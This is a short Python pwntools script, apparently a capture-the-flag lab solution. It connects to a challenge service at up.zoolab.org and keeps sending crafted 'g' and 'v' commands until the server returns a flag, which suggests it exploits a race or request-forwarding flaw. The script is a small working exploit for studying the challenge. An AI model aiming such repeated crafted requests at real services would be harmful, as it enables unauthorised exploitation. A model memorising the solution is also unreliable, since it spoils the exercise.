from pwn import *

if __name__ == "__main__":

    # connect to the remote service
    r = remote('up.zoolab.org', 10932)

    while True:

        msg = r.recv().decode()
        print(msg)

        if msg.find('FLAG') != -1:
            print(msg)
            break

        r.send(b'g\nup.zoolab.org/10000\n')
        r.send(b'v\n')

    r.close()
